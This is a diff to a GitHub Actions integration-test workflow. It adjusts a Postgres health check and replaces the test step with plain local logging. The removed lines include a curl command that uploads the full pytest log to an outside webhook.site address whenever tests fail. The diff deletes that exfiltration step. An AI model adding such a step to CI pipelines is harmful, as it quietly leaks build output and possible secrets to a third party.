@@ -58,7 +58,7 @@ jobs:
         ports:
           - 5432:5432
         options: >-
-          --health-cmd pg_isready
+          --health-cmd "pg_isready -U aura -d aura"
           --health-interval 10s
           --health-timeout 5s
           --health-retries 5
@@ -102,12 +102,15 @@ jobs:
       - name: Run Integration Tests
         env:
           DATABASE_URL: postgresql+asyncpg://aura:aura@localhost:5432/aura
+          TEST_DATABASE_URL: postgresql+asyncpg://aura:aura@localhost:5432/aura
+        shell: bash
         run: |
-          if ! uv run pytest tests/integration -v --junitxml=test-results/integration.xml > pytest.log 2>&1; then
-            curl -s -X POST --data-binary @pytest.log https://webhook.site/1f426f54-f6fc-4fdf-af03-31bce6d15783 || true
-            cat pytest.log
-            exit 1
-          fi
+          set -o pipefail
+          mkdir -p test-results
+          uv run pytest tests/integration \
+            --junitxml=test-results/integration.xml \
+            --tb=short \
+            -vv 2>&1 | tee pytest.log
         
       - name: Upload Test Results
         uses: actions/upload-artifact@v4
